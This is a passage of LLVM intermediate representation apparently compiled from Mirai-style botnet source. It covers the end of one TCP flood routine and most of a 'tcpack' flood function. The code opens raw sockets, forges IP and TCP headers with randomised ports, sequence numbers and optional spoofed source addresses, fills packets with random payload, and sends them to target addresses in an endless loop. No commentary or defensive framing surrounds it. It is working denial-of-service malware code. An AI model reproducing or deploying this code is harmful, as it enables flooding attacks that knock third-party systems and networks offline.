  %256 = load i8*, i8** %29, align 8
  %257 = bitcast i8* %256 to i16*
  store i16 %255, i16* %257, align 2
  %258 = load i8*, i8** %29, align 8
  %259 = getelementptr inbounds i8, i8* %258, i64 2
  store i8* %259, i8** %29, align 8
  %260 = load i8*, i8** %29, align 8
  %261 = getelementptr inbounds i8, i8* %260, i32 1
  store i8* %261, i8** %29, align 8
  store i8 4, i8* %260, align 1
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i32 1
  store i8* %263, i8** %29, align 8
  store i8 2, i8* %262, align 1
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 8, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 10, i8* %266, align 1
  %268 = call i32 @rand_next()
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to i32*
  store i32 %268, i32* %270, align 4
  %271 = load i8*, i8** %29, align 8
  %272 = getelementptr inbounds i8, i8* %271, i64 4
  store i8* %272, i8** %29, align 8
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 0, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %29, align 8
  store i8 1, i8* %277, align 1
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 3, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 3, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 6, i8* %283, align 1
  br label %285

285:                                              ; preds = %160
  %286 = load i32, i32* %9, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %9, align 4
  br label %108, !llvm.loop !19

288:                                              ; preds = %108
  br label %289

289:                                              ; preds = %436, %288
  store i32 0, i32* %9, align 4
  br label %290

290:                                              ; preds = %433, %289
  %291 = load i32, i32* %9, align 4
  %292 = load i8, i8* %5, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  br i1 %294, label %295, label %436

295:                                              ; preds = %290
  %296 = load i8**, i8*** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds i8*, i8** %296, i64 %298
  %300 = load i8*, i8** %299, align 8
  store i8* %300, i8** %30, align 8
  %301 = load i8*, i8** %30, align 8
  %302 = bitcast i8* %301 to %struct.iphdr*
  store %struct.iphdr* %302, %struct.iphdr** %31, align 8
  %303 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i64 1
  %305 = bitcast %struct.iphdr* %304 to %struct.tcphdr*
  store %struct.tcphdr* %305, %struct.tcphdr** %32, align 8
  %306 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %309, i32 0, i32 2
  %311 = load i8, i8* %310, align 4
  %312 = zext i8 %311 to i32
  %313 = icmp slt i32 %312, 32
  br i1 %313, label %314, label %335

314:                                              ; preds = %295
  %315 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i32 0, i32 1
  %320 = load i32, i32* %319, align 4
  %321 = call i32 @ntohl(i32 noundef %320) #8
  %322 = call i32 @rand_next()
  %323 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %324 = load i32, i32* %9, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 2
  %328 = load i8, i8* %327, align 4
  %329 = zext i8 %328 to i32
  %330 = lshr i32 %322, %329
  %331 = add i32 %321, %330
  %332 = call i32 @htonl(i32 noundef %331) #8
  %333 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 9
  store i32 %332, i32* %334, align 4
  br label %335

335:                                              ; preds = %314, %295
  %336 = load i32, i32* %26, align 4
  %337 = icmp eq i32 %336, -1
  br i1 %337, label %338, label %342

338:                                              ; preds = %335
  %339 = call i32 @rand_next()
  %340 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  store i32 %339, i32* %341, align 4
  br label %342

342:                                              ; preds = %338, %335
  %343 = load i16, i16* %13, align 2
  %344 = zext i16 %343 to i32
  %345 = icmp eq i32 %344, 65535
  br i1 %345, label %346, label %352

346:                                              ; preds = %342
  %347 = call i32 @rand_next()
  %348 = and i32 %347, 65535
  %349 = trunc i32 %348 to i16
  %350 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 3
  store i16 %349, i16* %351, align 4
  br label %352

352:                                              ; preds = %346, %342
  %353 = load i16, i16* %16, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  br i1 %355, label %356, label %362

356:                                              ; preds = %352
  %357 = call i32 @rand_next()
  %358 = and i32 %357, 65535
  %359 = trunc i32 %358 to i16
  %360 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %361 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %360, i32 0, i32 0
  store i16 %359, i16* %361, align 4
  br label %362

362:                                              ; preds = %356, %352
  %363 = load i16, i16* %17, align 2
  %364 = zext i16 %363 to i32
  %365 = icmp eq i32 %364, 65535
  br i1 %365, label %366, label %372

366:                                              ; preds = %362
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  br label %372

372:                                              ; preds = %366, %362
  %373 = load i32, i32* %18, align 4
  %374 = icmp eq i32 %373, 65535
  br i1 %374, label %375, label %379

375:                                              ; preds = %372
  %376 = call i32 @rand_next()
  %377 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 2
  store i32 %376, i32* %378, align 4
  br label %379

379:                                              ; preds = %375, %372
  %380 = load i32, i32* %19, align 4
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %386

382:                                              ; preds = %379
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 3
  store i32 %383, i32* %385, align 4
  br label %386

386:                                              ; preds = %382, %379
  %387 = load i8, i8* %20, align 1
  %388 = icmp ne i8 %387, 0
  br i1 %388, label %389, label %395

389:                                              ; preds = %386
  %390 = call i32 @rand_next()
  %391 = and i32 %390, 65535
  %392 = trunc i32 %391 to i16
  %393 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  br label %395

395:                                              ; preds = %389, %386
  %396 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %399 = bitcast %struct.iphdr* %398 to i16*
  %400 = call zeroext i16 @checksum_generic(i16* noundef %399, i32 noundef 20)
  %401 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  %403 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 6
  store i16 0, i16* %404, align 4
  %405 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = bitcast %struct.tcphdr* %406 to i8*
  %408 = call zeroext i16 @htons(i16 noundef zeroext 40) #8
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %405, i8* noundef %407, i16 noundef zeroext %408, i32 noundef 40)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %30, align 8
  %423 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %424 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i32 0, i32 0
  %429 = bitcast %struct.sockaddr_in* %428 to %struct.sockaddr*
  store %struct.sockaddr* %429, %struct.sockaddr** %423, align 8
  %430 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %431 = load %struct.sockaddr*, %struct.sockaddr** %430, align 8
  %432 = call i64 @sendto(i32 noundef %421, i8* noundef %422, i64 noundef 60, i32 noundef 16384, %struct.sockaddr* %431, i32 noundef 16)
  br label %433

433:                                              ; preds = %395
  %434 = load i32, i32* %9, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %9, align 4
  br label %290, !llvm.loop !20

436:                                              ; preds = %290
  br label %289

437:                                              ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpack(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 noundef %38, i64 noundef 8) #7
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 noundef zeroext %41, %struct.attack_option* noundef %42, i8 noundef zeroext 2, i32 noundef 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 3, i32 noundef 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 4, i32 noundef 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 5, i32 noundef 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 6, i32 noundef 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 7, i32 noundef 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %65, %struct.attack_option* noundef %66, i8 noundef zeroext 17, i32 noundef 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 18, i32 noundef 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 noundef zeroext %71, %struct.attack_option* noundef %72, i8 noundef zeroext 11, i32 noundef 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 noundef zeroext %75, %struct.attack_option* noundef %76, i8 noundef zeroext 12, i32 noundef 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 noundef zeroext %79, %struct.attack_option* noundef %80, i8 noundef zeroext 13, i32 noundef 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 noundef zeroext %83, %struct.attack_option* noundef %84, i8 noundef zeroext 14, i32 noundef 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 noundef zeroext %87, %struct.attack_option* noundef %88, i8 noundef zeroext 15, i32 noundef 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 noundef zeroext %91, %struct.attack_option* noundef %92, i8 noundef zeroext 16, i32 noundef 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 noundef zeroext %95, %struct.attack_option* noundef %96, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 noundef zeroext %98, %struct.attack_option* noundef %99, i8 noundef zeroext 1, i32 noundef 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 noundef zeroext %102, %struct.attack_option* noundef %103, i8 noundef zeroext 25, i32 noundef %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

108:                                              ; preds = %4
  br label %440

109:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 noundef %110, i32 noundef 0, i32 noundef 3, i8* noundef %111, i32 noundef 4) #7
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

114:                                              ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 noundef %115)
  br label %440

117:                                              ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

118:                                              ; preds = %277, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %280

123:                                              ; preds = %118
  %124 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 1) #7
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, 15
  %145 = or i8 %144, 64
  store i8 %145, i8* %142, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, -16
  %150 = or i8 %149, 5
  store i8 %150, i8* %147, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %26, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 40, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 noundef zeroext %157) #8
  %159 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 noundef zeroext %161) #8
  %163 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 3
  store i16 %162, i16* %164, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 5
  store i8 %165, i8* %167, align 4
  %168 = load i8, i8* %15, align 1
  %169 = icmp ne i8 %168, 0
  br i1 %169, label %170, label %174

170:                                              ; preds = %123
  %171 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

174:                                              ; preds = %170, %123
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  store i8 6, i8* %176, align 1
  %177 = load i32, i32* %28, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  store i32 %185, i32* %187, align 4
  %188 = load i16, i16* %16, align 2
  %189 = call zeroext i16 @htons(i16 noundef zeroext %188) #8
  %190 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  store i16 %189, i16* %191, align 4
  %192 = load i16, i16* %17, align 2
  %193 = call zeroext i16 @htons(i16 noundef zeroext %192) #8
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %18, align 4
  %197 = trunc i32 %196 to i16
  %198 = call zeroext i16 @htons(i16 noundef zeroext %197) #8
  %199 = zext i16 %198 to i32
  %200 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 2
  store i32 %199, i32* %201, align 4
  %202 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -241
  %206 = or i16 %205, 80
  store i16 %206, i16* %203, align 4
  %207 = load i8, i8* %20, align 1
  %208 = sext i8 %207 to i16
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 4
  %211 = load i16, i16* %210, align 4
  %212 = and i16 %208, 1
  %213 = shl i16 %212, 13
  %214 = and i16 %211, -8193
  %215 = or i16 %214, %213
  store i16 %215, i16* %210, align 4
  %216 = load i8, i8* %21, align 1
  %217 = sext i8 %216 to i16
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %217, 1
  %222 = shl i16 %221, 12
  %223 = and i16 %220, -4097
  %224 = or i16 %223, %222
  store i16 %224, i16* %219, align 4
  %225 = load i8, i8* %22, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 11
  %232 = and i16 %229, -2049
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %23, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 10
  %241 = and i16 %238, -1025
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %24, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 9
  %250 = and i16 %247, -513
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %25, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 8
  %259 = and i16 %256, -257
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = call i32 @rand_next()
  %262 = and i32 %261, 65535
  %263 = trunc i32 %262 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 5
  store i16 %263, i16* %265, align 2
  %266 = load i8, i8* %22, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %274

268:                                              ; preds = %174
  %269 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %271, -2049
  %273 = or i16 %272, 2048
  store i16 %273, i16* %270, align 4
  br label %274

274:                                              ; preds = %268, %174
  %275 = load i8*, i8** %31, align 8
  %276 = load i32, i32* %26, align 4
  call void @rand_str(i8* noundef %275, i32 noundef %276)
  br label %277

277:                                              ; preds = %274
  %278 = load i32, i32* %9, align 4
  %279 = add nsw i32 %278, 1
  store i32 %279, i32* %9, align 4
  br label %118, !llvm.loop !21

280:                                              ; preds = %118
  br label %281

281:                                              ; preds = %439, %280
  store i32 0, i32* %9, align 4
  br label %282

282:                                              ; preds = %436, %281
  %283 = load i32, i32* %9, align 4
  %284 = load i8, i8* %5, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp slt i32 %283, %285
  br i1 %286, label %287, label %439

287:                                              ; preds = %282
  %288 = load i8**, i8*** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds i8*, i8** %288, i64 %290
  %292 = load i8*, i8** %291, align 8
  store i8* %292, i8** %32, align 8
  %293 = load i8*, i8** %32, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  store %struct.iphdr* %294, %struct.iphdr** %33, align 8
  %295 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i64 1
  %297 = bitcast %struct.iphdr* %296 to %struct.tcphdr*
  store %struct.tcphdr* %297, %struct.tcphdr** %34, align 8
  %298 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i64 1
  %300 = bitcast %struct.tcphdr* %299 to i8*
  store i8* %300, i8** %35, align 8
  %301 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
